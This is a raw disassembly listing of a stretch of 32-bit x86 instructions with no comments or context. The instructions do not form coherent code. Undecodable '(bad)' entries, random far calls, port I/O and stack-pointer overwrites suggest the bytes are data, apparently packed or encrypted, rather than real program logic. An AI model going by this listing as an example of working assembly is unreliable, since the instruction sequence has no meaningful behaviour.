  413ef7:	outs   dx,DWORD PTR ds:[esi]
  413ef8:	pop    esi
  413ef9:	mov    ebx,0x80aad76f
  413efe:	int3   
  413eff:	dec    esp
  413f00:	imul   ebp,esi,0x10
  413f03:	mov    ch,0x38
  413f05:	pushf  
  413f06:	adc    eax,DWORD PTR [edi-0x2d]
  413f09:	inc    esp
  413f0a:	(bad)  
  413f0b:	sbb    BYTE PTR [eax],ch
  413f0d:	(bad)  
  413f0e:	int    0xad
  413f10:	xor    BYTE PTR ds:0x7e36c065,al
  413f16:	call   0x8ca4:0x2da28116
  413f1d:	ss rcr ebp,0x5c
  413f21:	xor    eax,0xe1d1456e
  413f26:	outs   dx,DWORD PTR ds:[esi]
  413f27:	dec    ebx
  413f28:	mov    eax,0xa97dfc4c
  413f2d:	das    
  413f2e:	mov    ch,0xf3
  413f30:	jb     0x413f36
  413f32:	(bad)  
  413f33:	out    dx,eax
  413f34:	xor    DWORD PTR [edx+edx*1-0x2],esi
  413f38:	add    cx,WORD PTR [ebx+0x6]
  413f3c:	test   al,0x1b
  413f3e:	pop    edi
  413f3f:	call   0x37bf0242
  413f44:	mov    edx,0x38e3c7fa
  413f49:	cwde   
  413f4a:	repnz loop 0x413f26
  413f4d:	xor    DWORD PTR [ebx+0x2f],edi
  413f50:	mov    esp,0x572d8d7d
  413f55:	inc    ecx
  413f56:	add    edx,ecx
  413f58:	rcr    BYTE PTR [eax-0x7e],1
  413f5b:	push   0x52fa0cd2
  413f60:	pop    eax
  413f61:	pop    ss
  413f62:	test   dh,cl
  413f64:	les    edx,FWORD PTR [ecx+ecx*1-0x7e18f699]
  413f6b:	adc    al,0xd0
  413f6d:	(bad)  
  413f6e:	jmp    0x3bd63b27
  413f73:	gs jb  0x413f13
  413f76:	ret    0x8d70
  413f79:	and    ch,BYTE PTR [ebp-0x56]
  413f7c:	xor    eax,0x6066fcb1
  413f81:	inc    eax
  413f82:	xchg   esi,eax
  413f83:	les    ecx,FWORD PTR [ecx+0x1b]
  413f86:	loopne 0x413f47
  413f88:	fidiv  WORD PTR [edx-0x678c9253]
  413f8e:	cli    
  413f8f:	mov    dl,0x86
  413f91:	fnstenv [esi+esi*4]
  413f94:	mov    ds:0x1046cc2d,al
  413f99:	popf   
  413f9a:	ins    BYTE PTR es:[edi],dx
  413f9b:	out    0x15,eax
  413f9d:	fwait
  413f9e:	mov    edi,0x2d50d836
  413fa3:	cmp    eax,0x41c34e1d
  413fa8:	ja     0x413fbc
  413faa:	sub    dh,BYTE PTR [esp+ebx*8+0x6b]
  413fae:	or     BYTE PTR [esi+0x7b],0xe8
  413fb2:	and    ah,dh
  413fb4:	pop    edi
  413fb5:	lods   al,BYTE PTR ds:[esi]
  413fb6:	pop    ebx
  413fb7:	or     DWORD PTR [ebx-0x2],ecx
  413fba:	xor    BYTE PTR [esi+0x4d],al
  413fbd:	aad    0x72
  413fbf:	xchg   ebx,eax
  413fc0:	push   ss
  413fc1:	aad    0xa2
  413fc3:	inc    esi
  413fc4:	xor    bl,al
  413fc6:	sub    BYTE PTR [ecx+0x52],0x43
  413fca:	sbb    dh,BYTE PTR [ebx+eiz*1]
  413fcd:	ins    BYTE PTR es:[edi],dx
  413fce:	dec    esp
  413fcf:	cmp    BYTE PTR [eax+esi*8+0x6b],dl
  413fd3:	add    al,0xa4
  413fd5:	stc    
  413fd6:	aad    0x45
  413fd8:	add    al,0x9b
  413fda:	xchg   esp,eax
  413fdb:	test   dh,bl
  413fdd:	cdq    
  413fde:	mov    ecx,0x9f96f38c
  413fe3:	add    eax,ebx
  413fe5:	jbe    0x413fbb
  413fe7:	adc    BYTE PTR [esi-0x64],0x40
  413feb:	mov    ds:0xc6ec81fe,al
  413ff0:	sbb    al,0xf1
  413ff2:	mov    bl,0xe2
  413ff4:	jno    0x413f79
  413ff6:	sbb    eax,0xc0ec5f5e
  413ffb:	dec    ecx
  413ffc:	pop    eax
  413ffd:	loopne 0x413ff2
  413fff:	das    
  414000:	fcmovu st,st(0)
  414002:	jg     0x413fb8
  414004:	dec    eax
  414005:	sbb    DWORD PTR [eax+0x7c16c67d],eax
  41400b:	inc    ebx
  41400c:	out    0x4,eax
  41400e:	xchg   ecx,eax
  41400f:	push   0x8a14d617
  414014:	lea    edx,[ebx-0x10951ae0]
  41401a:	mov    esp,0xdb868631
  41401f:	call   0xc233ed74
  414024:	sti    
  414025:	adc    BYTE PTR [eax+0x5],al
  414028:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414029:	lahf   
  41402a:	cmovp  esi,DWORD PTR [esi+0x1f]
  41402e:	sub    esi,DWORD PTR [ebx-0x77f29334]
  414034:	popa   
  414035:	pop    edi
  414036:	lds    eax,FWORD PTR [ebp-0x1e746617]
  41403c:	xor    bl,cl
  41403e:	mov    ecx,ebp
  414040:	adc    esi,DWORD PTR [eax]
  414042:	(bad)  
  414043:	jbe    0x414075
  414045:	lock sar DWORD PTR [ecx-0x2ec9edad],1
  41404c:	xor    dl,BYTE PTR [edx]
  41404e:	pop    ebp
  41404f:	ds (bad) 
  414051:	popf   
  414052:	dec    ebx
  414053:	jp     0x41403f
  414055:	mov    edx,0xd8bcfccd
  41405a:	sub    al,ch
  41405c:	jl     0x414010
  41405e:	jnp    0x4140ce
  414060:	dec    eax
  414061:	in     al,0x7e
  414063:	(bad)  
  414064:	adc    bl,BYTE PTR [ecx]
  414066:	rcr    ebx,cl
  414068:	das    
  414069:	sub    eax,0xb8bbefe9
  41406e:	shl    DWORD PTR [esi-0x153e19ab],0xe7
  414075:	clc    
  414076:	scas   al,BYTE PTR es:[edi]
  414077:	shr    BYTE PTR [esi],1
  414079:	cmp    bh,BYTE PTR [edx-0x2f50baca]
  41407f:	mov    BYTE PTR [edx+0x63],bl
  414082:	cld    
  414083:	outs   dx,BYTE PTR ds:[esi]
  414084:	cmp    esp,ebp
  414086:	and    DWORD PTR [ebp+edx*2-0x15bd6b6b],edx
  41408d:	xchg   DWORD PTR [ecx+eax*2-0x7],edx
  414091:	xor    dl,dh
  414093:	fwait
  414094:	test   al,0xf6
  414096:	fldcw  WORD PTR [esi+0x60]
  414099:	jns    0x414031
  41409b:	mov    edx,0x819da09a
  4140a0:	mov    ecx,0x36f260e6
  4140a5:	and    DWORD PTR [ecx-0x3dfa4cd],esi
  4140ab:	and    esi,0xffffffff
  4140ae:	push   edx
  4140af:	test   DWORD PTR [esi],ebp
  4140b1:	pop    es
  4140b2:	je     0x414092
  4140b4:	ins    DWORD PTR es:[edi],dx
  4140b5:	fild   DWORD PTR [ebp-0x476bb3d4]
  4140bb:	add    bl,bl
  4140bd:	push   ds
  4140be:	cmp    cl,BYTE PTR [ebp+0x7c246279]
  4140c4:	inc    ebp
  4140c5:	into   
  4140c6:	xchg   ebp,eax
  4140c7:	stos   DWORD PTR es:[edi],eax
  4140c8:	cmp    DWORD PTR [edx+eax*2],ebp
  4140cb:	hlt    
  4140cc:	push   0x24a4d3a3
  4140d1:	or     eax,0xd18f754f
  4140d6:	pop    edi
  4140d7:	mov    al,0x11
  4140d9:	mov    dl,0x84
  4140db:	ret    
  4140dc:	xor    eax,0xce74804a
  4140e1:	mov    al,0xe8
  4140e3:	lods   al,BYTE PTR ss:[esi]
  4140e5:	pop    eax
  4140e6:	or     DWORD PTR [eax+eiz*2],ebx
  4140e9:	or     eax,DWORD PTR [eax-0x53ef9bda]
  4140ef:	mov    edx,0xc4a0d4d
  4140f4:	mov    cl,0x4
  4140f6:	pusha  
  4140f7:	or     DWORD PTR [ebp-0x7819f7b],ecx
  4140fd:	jl     0x414124
  4140ff:	xor    al,0x97
  414101:	push   ss
  414102:	out    0x9e,eax
  414104:	push   ecx
  414105:	pop    edi
  414106:	lahf   
  414107:	xchg   edx,eax
  414108:	fild   QWORD PTR [ecx]
  41410a:	test   eax,0xb00c18e0
  41410f:	in     eax,dx
  414110:	cli    
  414111:	add    ch,BYTE PTR [ecx+0x3c]
  414114:	or     eax,0x6bcf94d0
  414119:	test   DWORD PTR [ecx+edx*1+0xc],esp
  41411d:	loopne 0x41412b
  41411f:	sbb    DWORD PTR [edi+0x24e7149f],0x1c5f3c89
  414129:	fadd   QWORD PTR [edx]
  41412b:	push   cs
  41412c:	dec    esp
  41412d:	test   eax,0x1fb0dbde
  414132:	nop
  414133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414134:	int3   
  414135:	pushf  
  414136:	mov    BYTE PTR [eax+0xa],bl
  414139:	sub    dh,BYTE PTR [esi+0x1310b231]
  41413f:	lea    edi,[eax-0x68bf48cf]
  414145:	push   es
  414146:	int3   
  414147:	cmp    al,0x63
  414149:	mov    al,0xf4
  41414b:	daa    
  41414c:	add    DWORD PTR [ebx+ecx*8],0xe
  414150:	jbe    0x414102
  414152:	nop
  414153:	or     al,ah
  414155:	cwde   
  414156:	or     al,0x69
  414158:	pop    es
  414159:	mov    bl,0x96
  41415b:	les    eax,FWORD PTR [ebx-0x30]
  41415e:	or     BYTE PTR [edi-0x3fe2365d],dh
  414164:	pusha  
  414165:	sbb    BYTE PTR [eax+0x1f],0x89
  414169:	cmp    al,0x41
  41416c:	sub    eax,0x79c5e64a
  414171:	lods   eax,DWORD PTR ds:[esi]
  414172:	sub    DWORD PTR [ecx+0x2241a61a],ecx
  414178:	push   ss
  414179:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41417a:	sub    al,BYTE PTR [esi+0x2d4ac247]
  414180:	shr    DWORD PTR [esi-0x58c46023],0x3c
  414187:	pop    esi
  414188:	or     ebx,DWORD PTR [edx+0x39]
  41418b:	mov    eax,ds:0x90206456
  414190:	mov    esp,0x21bbba9e
  414195:	push   0x1917afe0
  41419a:	and    al,BYTE PTR [esi+eiz*2]
  41419d:	out    0x24,al
  41419f:	into   
  4141a0:	jns    0x4141e8
  4141a2:	push   es
  4141a3:	pushf  
  4141a4:	jmp    0x4141f8
  4141a6:	stos   BYTE PTR es:[edi],al
  4141a7:	int    0xd0
  4141a9:	cmovl  ebx,esp
  4141ac:	sub    BYTE PTR [edx],al
  4141ae:	loopne 0x414148
  4141b0:	retf   0x695e
  4141b3:	cli    
  4141b4:	out    0xf3,al
  4141b6:	pop    esi
  4141b7:	add    eax,DWORD PTR [ebx-0x70]
  4141ba:	xchg   ecx,eax
  4141bb:	xchg   ebp,eax
  4141bc:	add    al,0x2c
  4141be:	data16 adc BYTE PTR [edx+0x50],0x6
  4141c3:	loope  0x414240
  4141c5:	xor    ebp,DWORD PTR [ecx+ebp*2+0x5c]
  4141c9:	sbb    eax,0x87bebd17
  4141ce:	and    al,0x87
  4141d0:	pushf  
  4141d1:	stc    
  4141d2:	leave  
  4141d3:	pop    esp
  4141d4:	xchg   edx,eax
  4141d5:	int3   
  4141d6:	pop    esp
  4141d7:	lds    esi,FWORD PTR [ecx-0x5d]
  4141da:	ret    0xbce5
  4141dd:	in     al,0x71
  4141df:	in     al,0x34
  4141e1:	pop    eax
  4141e2:	mov    ds:0x2ed2961b,eax
  4141e7:	cld    
  4141e8:	in     al,dx
  4141e9:	dec    edi
  4141ea:	cmovae ebp,DWORD PTR [ebp+0x3f4ca100]
  4141f1:	xchg   esp,eax
  4141f2:	xchg   edi,eax
  4141f3:	in     eax,0xbb
  4141f5:	sub    eax,0x294fe6
  4141fa:	gs xchg ebx,eax
  4141fc:	addr16 xor bl,cl
  4141ff:	call   0x2166:0x9f5e7499
  414206:	adc    eax,0x66e3fd45
  41420b:	mov    ds:0xb2c4c7d0,eax
  414210:	mov    al,ds:0xf55d90a5
  414215:	pop    ss
  414216:	sbb    eax,0x8aeac66f
  41421b:	lock fucom st(4)
  41421e:	js     0x41428d
  414220:	jno    0x414260
  414222:	mov    dl,0x38
  414224:	sbb    ecx,DWORD PTR [edi-0x77367f6f]
  41422a:	mov    al,ds:0xfff9308b
  41422f:	pop    ds
  414230:	sub    BYTE PTR [esi],ah
  414232:	cmc    
  414233:	cs add al,0x58
  414236:	cld    
  414237:	pusha  
  414238:	adc    ebp,DWORD PTR [ebp-0x40]
  41423b:	and    BYTE PTR [esi+eax*8+0x77],dl
  41423f:	lods   al,BYTE PTR ds:[esi]
  414240:	pop    ds
  414241:	pusha  
  414242:	mov    bh,0xf5
  414244:	dec    edx
  414245:	test   DWORD PTR [eax+0x39fcfc9a],edi
  41424b:	leave  
  41424c:	aad    0x4e
  41424e:	pop    ss
  41424f:	maxps  xmm7,xmm0
  414252:	mov    ecx,0x60a0f4c6
  414257:	es in  eax,0x14
  41425a:	cld    
  41425b:	and    dh,al
  41425d:	mov    ds:0xe43b3ae2,al
  414262:	mov    ecx,0x2a4d2a03
  414267:	shl    DWORD PTR [ebx-0x3e],0x8b
  41426b:	xchg   bl,ch
  41426d:	call   0xc889cdd1
  414272:	shl    dh,cl
  414274:	mov    bl,0xa1
  414276:	std    
  414277:	dec    esp
  414278:	and    ebx,ecx
  41427a:	imul   ebx,DWORD PTR [bp+di+0x10f8],0xf8922e81
  414283:	xchg   edx,eax
  414284:	pop    esi
  414285:	adc    ah,BYTE PTR [ecx-0x3cb5caa7]
  41428b:	pop    es
  41428c:	in     al,dx
  41428d:	addr16 addr16 xor al,0x3e
  414291:	repnz scas eax,DWORD PTR es:[edi]
  414293:	dec    esp
  414294:	mov    edx,es
  414296:	je     0x414268
  414298:	outs   dx,DWORD PTR ds:[esi]
  414299:	pop    ds
  41429a:	cs xchg ebx,eax
  41429c:	xchg   edx,eax
  41429d:	outs   dx,BYTE PTR ds:[esi]
  41429e:	repnz imul esp,DWORD PTR ds:0xdcb6b7d,0x78
  4142a6:	call   0xcc57:0x3d7a9e7e
  4142ad:	xor    dl,bh
  4142af:	fcomp  st(0)
  4142b1:	outs   dx,DWORD PTR ds:[esi]
  4142b2:	out    0x1e,eax
  4142b4:	scas   al,BYTE PTR es:[edi]
  4142b5:	cdq    
  4142b6:	pop    ecx
  4142b7:	jle    0x41429b
  4142b9:	stc    
  4142ba:	push   ebx
  4142bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142bc:	div    BYTE PTR [ebx+edi*4+0x7b]
  4142c0:	pop    ds
  4142c1:	cmp    dl,bh
  4142c3:	sbb    BYTE PTR [edx+0x667dd5ee],dl
  4142c9:	fisttp WORD PTR [ebp+0x5b]
  4142cc:	cdq    
  4142cd:	js     0x414276
  4142cf:	inc    ebp
  4142d0:	icebp  
  4142d1:	fstp   DWORD PTR [edx]
  4142d3:	mul    ebx
  4142d5:	add    DWORD PTR cs:[esi+edx*8],eax
  4142d9:	mov    eax,ds:0xfcae1c02
  4142de:	sbb    DWORD PTR [edi+0x2e],esi
  4142e1:	jbe    0x414288
  4142e3:	adc    DWORD PTR [ebp+0x2edbb9ac],ebx
  4142e9:	out    0x19,al
  4142eb:	fsubr  DWORD PTR [edx-0x6e]
  4142ee:	fbstp  TBYTE PTR [ecx]
  4142f0:	gs (bad) 
  4142f2:	leave  
  4142f3:	sub    DWORD PTR [ebx+0x48a2d78f],esi
  4142f9:	or     eax,DWORD PTR [eax+ebp*1]
  4142fc:	jo     0x414347
  4142fe:	ret    
  4142ff:	pop    edx
  414300:	adc    dh,cl
  414302:	sub    dl,BYTE PTR [esi-0x1c]
  414305:	popa   
  414306:	pop    ds
  414307:	loop   0x41434d
  414309:	mov    WORD PTR [esp+eax*1+0x4c],gs
  41430d:	inc    eax
  41430e:	bnd jl 0x4142eb
  414311:	gs and al,0xe1
  414314:	adc    eax,0xaa58fddd
  414319:	mov    ebx,DWORD PTR [ebx+esi*8-0x3d]
  41431d:	xchg   ecx,eax
  41431e:	adc    BYTE PTR [edx+0x52d0b134],ch
  414324:	and    BYTE PTR [ebx-0x43],0x2c
  414328:	shr    ah,0xe8
  41432b:	das    
  41432c:	xchg   DWORD PTR [ebx],esi
  41432e:	push   ds
  41432f:	add    BYTE PTR [eax],0x2e
  414332:	inc    esp
  414333:	add    DWORD PTR [edi+edi*2+0x12],esi
  414337:	fcomp  DWORD PTR [edi+ebx*1]
  41433a:	dec    eax
  41433b:	jnp    0x4142dd
  41433d:	mov    edi,0xe11e7a1
  414342:	in     al,0x18
  414344:	jmp    0x1c719cbe
  414349:	mov    esp,0x5ca36cf7
  41434e:	out    0xa5,eax
  414350:	xor    DWORD PTR [ecx],ebx
  414352:	aaa    
  414353:	repz rcr BYTE PTR [ebx],cl
  414356:	in     al,dx
  414357:	imul   eax,DWORD PTR [ebp+0x14afa3d8],0x4f
  41435e:	pop    edx
  41435f:	pop    ebp
  414360:	ja     0x4142fe
  414362:	jg     0x414397
  414364:	mov    ds:0xe3e096d2,al
  414369:	dec    ebx
  41436a:	mov    ebp,DWORD PTR [ebx+0xcd2e849]
  414370:	mov    ebp,0x7651dc7d
  414375:	mov    ds:0xe17c08d1,al
  41437a:	and    ebx,DWORD PTR [edi-0x2f]
  41437d:	sahf   
  41437e:	jne    0x41433a
  414380:	add    al,0x3
  414382:	pop    esi
  414383:	cmp    DWORD PTR [ecx+0x5560b94d],eax
  414389:	scas   al,BYTE PTR es:[edi]
  41438a:	jp     0x41436b
  41438c:	data16 lods al,BYTE PTR ds:[esi]
  41438e:	ss cwde 
  414390:	mov    esp,0x546543a5
  414395:	pop    edx
  414396:	ds adc ebp,esi
  414399:	enter  0x18a2,0x22
  41439d:	out    0xcb,al
  41439f:	cmp    al,BYTE PTR [esi+ebx*2]
  4143a2:	xor    al,0x6c
  4143a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143a5:	pushf  
  4143a6:	xchg   ebx,eax
  4143a7:	outs   dx,BYTE PTR ds:[esi]
  4143a8:	add    BYTE PTR [ebp+eiz*8+0x7a],dh
  4143ac:	bound  esp,QWORD PTR [eax]
  4143ae:	xor    BYTE PTR gs:[esp+ebp*8+0x32a810bd],bl
  4143b6:	daa    
  4143b7:	dec    edx
  4143b8:	jno    0x414354
  4143ba:	sbb    bl,al
  4143bc:	adc    DWORD PTR gs:[edi],0xffffffd8
  4143c0:	pop    esi
  4143c1:	jne    0x4143e0
  4143c3:	out    0x83,eax
  4143c5:	(bad)  
  4143c7:	sbb    esi,0xaf10e25b
  4143cd:	mov    cl,0xeb
  4143cf:	push   0x26
  4143d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143d2:	xchg   ebx,eax
  4143d3:	push   ebp
  4143d4:	out    0x92,al
  4143d6:	outs   dx,BYTE PTR ds:[esi]
  4143d7:	xchg   ecx,eax
  4143d8:	jle    0x414431
  4143da:	push   esp
  4143db:	imul   eax,DWORD PTR [ebx-0x32caed62],0x39
  4143e2:	sub    eax,0x3017a656
  4143e7:	push   ss
  4143e8:	sub    bl,bh
  4143ea:	sahf   
  4143eb:	jnp    0x4143e9
  4143ed:	cwde   
  4143ee:	xchg   esi,eax
  4143ef:	or     al,0xf4
  4143f1:	loop   0x4143cf
  4143f3:	xor    bh,BYTE PTR [edi-0x4dc3f29a]
  4143f9:	mov    al,ds:0x67a2bdee
  4143fe:	fldenv [ebp+0x56]
  414401:	shl    DWORD PTR [edi-0x6e261ed9],1
  414407:	fdivr  QWORD PTR [ebp+0x4e]
  41440a:	push   ss
  41440b:	retf   0xb2a3
  41440e:	jmp    0x85fd0058
  414413:	pushf  
  414414:	mov    bl,0x32
  414416:	xor    ah,BYTE PTR [esi+0x3916decf]
  41441c:	gs xchg ebx,eax
  41441e:	sbb    al,ch
  414420:	sti    
  414421:	jle    0x41444e
  414423:	sbb    BYTE PTR cs:[edi-0x63],0x13
  414428:	addr16 dec esi
  41442a:	js     0x4143b0
  41442c:	push   ebp
  41442d:	out    0x6e,eax
  41442f:	jle    0x414466
  414431:	dec    ecx
  414432:	and    eax,0xeab8c9a2
  414437:	xchg   ebp,eax
  414438:	ret    
  414439:	or     BYTE PTR [ecx+0x1a0d43dc],cl
  41443f:	xchg   edx,eax
  414440:	jne    0x41446a
  414442:	inc    esi
  414443:	fcom   DWORD PTR [edi]
  414445:	mov    fs,esi
  414447:	fnsave [ecx+0x48]
  41444a:	in     eax,0xb1
  41444c:	xor    eax,0xe39a61c
  414451:	(bad)  
  414453:	xchg   DWORD PTR [ecx+ecx*2-0x50],ecx
  414457:	cmc    
  414458:	mov    ecx,0x59dc618e
  41445d:	dec    ebx
  41445e:	cdq    
  41445f:	sub    eax,ebp
  414461:	div    cl
  414463:	fsubr  DWORD PTR [esp+edx*2+0x3e]
  414467:	mov    dh,0x7f
  414469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41446a:	xor    DWORD PTR [eax+esi*8-0x69512aab],0x72
  414472:	jo     0x4144a2
  414474:	and    al,0x71
  414476:	(bad)
  41447a:	or     al,0x4d
  41447c:	loop   0x414447
  41447e:	cmc    
  41447f:	adc    ebp,DWORD PTR [ebp-0x30]
  414482:	lods   al,BYTE PTR ds:[esi]
  414483:	iret   
  414484:	in     eax,0xbb
  414486:	shl    BYTE PTR [edx-0x65bb32ee],cl
  41448c:	shr    DWORD PTR [esi-0x6c],cl
  41448f:	and    eax,0x3de9b98a
  414494:	sub    eax,0xb5d1191c
  414499:	cld    
  41449a:	mov    eax,ds:0x355fe98f
  41449f:	sub    DWORD PTR [eax-0x1e],eax
  4144a2:	and    esi,edx
  4144a4:	cmc    
  4144a5:	mov    edx,0x8ad6c127
  4144aa:	cld    
  4144ab:	add    al,BYTE PTR [ecx*1+0x7b993fd4]
  4144b2:	xchg   esi,eax
  4144b3:	mov    ?,eax
  4144b5:	or     BYTE PTR [ebx],cl
  4144b7:	pushf  
  4144b8:	lea    esp,[esi]
  4144ba:	xchg   ebx,eax
  4144bb:	mov    DWORD PTR [esi+0x6f],esi
  4144be:	add    eax,0x41bac92
  4144c3:	mov    dh,0x64
  4144c5:	xchg   ecx,eax
  4144c6:	or     ch,BYTE PTR [ebp-0x41282252]
  4144cc:	je     0x414479
  4144ce:	inc    esp
  4144cf:	int3   
  4144d0:	mov    WORD PTR [edx-0x72],?
  4144d3:	es in  al,0xa5
  4144d6:	xchg   ebx,eax
  4144d7:	fnstcw WORD PTR [ebp+0x151c1bef]
  4144dd:	add    edi,ebx
  4144df:	add    ch,bh
  4144e1:	sti    
  4144e2:	push   ds
  4144e3:	stos   BYTE PTR es:[edi],al
  4144e4:	add    cl,ah
  4144e6:	mov    bl,0xc8
  4144e8:	retf   
  4144e9:	scas   al,BYTE PTR es:[edi]
  4144ea:	sar    DWORD PTR [eax-0x5ac8b985],1
  4144f0:	pusha  
  4144f1:	mov    ecx,0xdbf9fe7b
  4144f6:	push   edi
  4144f7:	lods   al,BYTE PTR ds:[esi]
  4144f8:	popf   
  4144f9:	inc    ebp
  4144fa:	stos   BYTE PTR es:[edi],al
  4144fb:	or     BYTE PTR ds:0xb918ac34,dl
  414501:	retf   
  414502:	or     ecx,ebp
  414504:	in     al,dx
  414505:	les    edi,FWORD PTR [ebx+0x44]
  414508:	jae    0x414569
  41450a:	je     0x414568
  41450c:	test   al,0x59
  41450e:	sar    BYTE PTR [esi+0x75],1
  414511:	jecxz  0x4144a7
  414513:	loopne 0x414544
  414515:	jbe    0x4144ad
  414517:	or     DWORD PTR [eax],eax
  414519:	xchg   edx,eax
  41451a:	xchg   esi,eax
  41451b:	arpl   bx,bp
  41451d:	div    BYTE PTR ds:0x4d65660
  414523:	inc    edi
  414524:	cmp    eax,0xae400c6c
  414529:	dec    edx
  41452a:	jnp    0x4144ec
  41452c:	mov    al,ds:0x20427ae1
  414531:	xor    DWORD PTR [ecx-0xc7b4d9a],ebp
  414537:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  414539:	ins    DWORD PTR es:[edi],dx
  41453a:	mov    al,0xae
  41453c:	into   
  41453d:	pusha  
  41453e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41453f:	pop    edx
  414540:	out    dx,al
  414541:	aaa    
  414542:	add    DWORD PTR [edx-0x10],0xe867db2e
  414549:	and    BYTE PTR [ebp+edx*4+0x31061882],ah
  414550:	inc    eax
  414551:	adc    eax,0x136837c0
  414556:	call   0x3c70fa3d
  41455b:	sbb    dl,al
  41455d:	cwde   
  41455e:	(bad)  
  41455f:	pop    ebp
  414560:	stc    
  414561:	mov    gs,WORD PTR ds:[ecx+0x28]
  414565:	mov    DWORD PTR [ecx],edx
  414567:	mov    edx,eax
  414569:	call   0x4d22:0x628b8945
  414570:	loope  0x4145e7
  414572:	jmp    0x4145ce
  414574:	xor    al,0x5a
  414576:	nop
  414577:	js     0x4145c8
  414579:	(bad)  
  41457a:	dec    esi
  41457b:	test   DWORD PTR [eax],0xd8042a17
  414581:	out    0x2f,al
  414583:	popf   
  414584:	retf   0x94cf
  414587:	adc    BYTE PTR [ecx],bl
  414589:	je     0x414573
  41458b:	cmp    bh,ah
  41458d:	enter  0x25c2,0x1d
  414591:	mov    eax,ds:0xda5e91e4
  414596:	call   0x4803a393
  41459b:	cmp    bh,dl
  41459d:	cld    
  41459e:	aad    0x36
  4145a0:	xchg   edi,eax
  4145a1:	mov    ch,0x5e
  4145a3:	pop    ss
  4145a4:	adc    bl,cl
  4145a6:	pop    ds
  4145a7:	jg     0x414605
  4145a9:	jnp    0x41453f
  4145ab:	adc    eax,0xf845cbf9
  4145b0:	adc    al,0x57
  4145b2:	iret   
  4145b3:	lds    esi,FWORD PTR [eax]
  4145b5:	in     eax,0xe3
  4145b7:	int    0xc7
  4145b9:	jae    0x4145f1
  4145bb:	inc    edx
  4145bc:	pusha  
  4145bd:	xor    bh,BYTE PTR [eax+edx*8-0x3f2dc851]
  4145c4:	(bad)  
  4145c5:	in     eax,0xc7
  4145c7:	cmp    bl,BYTE PTR [ebx-0x4b]
  4145ca:	fcmove st,st(0)
  4145cc:	jbe    0x414610
  4145ce:	mov    ah,0xd7
  4145d0:	cwde   
  4145d1:	adc    DWORD PTR [ecx+0x62],ebx
  4145d4:	xchg   edi,edi
  4145d6:	xor    eax,0x4bc3adc5
  4145db:	fdivr  QWORD PTR [ecx-0x1d]
  4145de:	in     al,dx
  4145df:	in     eax,0x4a
  4145e1:	les    eax,FWORD PTR [ebx+eax*8+0x25]
  4145e5:	jo     0x4145d2
  4145e7:	inc    ebx
  4145e8:	ret    0x67de
  4145eb:	dec    edi
  4145ec:	mov    ah,0xa4
  4145ee:	jbe    0x414581
  4145f0:	dec    ebp
  4145f1:	inc    esi
  4145f2:	or     eax,0x6280c941
  4145f7:	pop    es
  4145f8:	push   0xffffffa0
  4145fa:	aaa    
  4145fb:	jns    0x414588
  4145fd:	ins    BYTE PTR es:[edi],dx
  4145fe:	jmp    0x41460c
  414600:	xchg   dh,bh
  414602:	fwait
  414603:	(bad)  
  414604:	inc    ebx
  414605:	loop   0x41460f
  414607:	jp     0x4145b0
  414609:	mov    bl,dl
  41460b:	repnz push eax
  41460d:	sub    ch,bl
  41460f:	push   edx
  414610:	jbe    0x414683
  414612:	jl     0x414619
  414614:	mov    ah,0xb2
  414616:	and    eax,eax
  414618:	sar    edx,cl
  41461a:	push   0xffffffbd
  41461c:	sub    eax,0xe22d99e
  414621:	ss mov edi,0xb99def2
  414627:	test   al,0x2
  414629:	sbb    ch,BYTE PTR [eax-0x1afd21c]
  41462f:	sti    
  414630:	xor    DWORD PTR [eax+ebp*1+0x73],ecx
  414634:	jno    0x41466f
  414636:	mov    ch,0x66
  414638:	test   eax,0x4fb8e16a
  41463d:	pop    eax
  41463e:	test   eax,0x2e0b980d
  414643:	stc    
  414644:	outs   dx,BYTE PTR ds:[esi]
  414645:	addr16 push ebp
  414647:	cli    
  414648:	(bad)  
  414649:	pop    ebp
  41464a:	int    0x73
  41464c:	es retf 0xc2c0
  414650:	dec    edi
  414651:	and    DWORD PTR [edx],ebp
  414653:	mov    esi,0x185da7d
  414658:	mov    ebp,0x44545a3d
  41465d:	popa   
  41465e:	aad    0x37
  414660:	cmp    dl,BYTE PTR [edx-0x36d08650]
  414666:	push   esi
  414667:	pushw  0xffbf
  41466a:	sar    BYTE PTR [edx],0xa6
  41466d:	ds retf 
  41466f:	mul    ebp
  414671:	sahf   
  414672:	(bad)  
  414673:	mov    edi,0x56540743
  414678:	in     eax,0xaf
  41467a:	rep ins DWORD PTR es:[edi],dx
  41467c:	out    dx,al
  41467d:	mov    ch,0x28
  41467f:	rol    DWORD PTR [ebx+0x245fa81b],cl
  414685:	jbe    0x4146ca
  414687:	jae    0x41469c
  414689:	jle    0x414610
  41468b:	inc    eax
  41468c:	cmp    al,0xa5
  41468e:	rcr    BYTE PTR [esi],0x5c
  414691:	sub    DWORD PTR [esi],edx
  414693:	pushf  
  414694:	push   ebp
  414695:	ds repz add edx,eax
  414699:	adc    eax,0x31aa46fa
  41469e:	mov    esi,0x3c37904a
  4146a3:	std    
  4146a4:	push   cs
  4146a5:	dec    ebx
  4146a6:	stos   BYTE PTR es:[edi],al
  4146a7:	inc    ebp
  4146a8:	adc    DWORD PTR [edi-0x24],ebx
  4146ab:	js     0x41462f
  4146ad:	outs   dx,BYTE PTR ds:[esi]
  4146ae:	push   ss
  4146af:	mov    edx,0x627dde35
  4146b4:	dec    eax
  4146b5:	in     al,0x5a
  4146b7:	test   DWORD PTR [esi+ebx*1],ebp
  4146ba:	cmp    edx,DWORD PTR [esp+eax*8]
  4146bd:	stos   DWORD PTR es:[edi],eax
  4146be:	pop    ebx
  4146bf:	bound  ecx,QWORD PTR [eax+0xe]
  4146c2:	mov    esi,0xc4447c6e
  4146c7:	jl     0x4146c8
  4146c9:	mov    eax,ds:0x71693ffc
  4146ce:	ja     0x4146e9
  4146d0:	outs   dx,BYTE PTR ds:[esi]
  4146d1:	mov    edx,0xaf63b9ce
  4146d6:	loop   0x41467a
  4146d8:	cmp    dh,BYTE PTR [eax+edx*1-0x5cd1f1cd]
  4146df:	inc    ebx
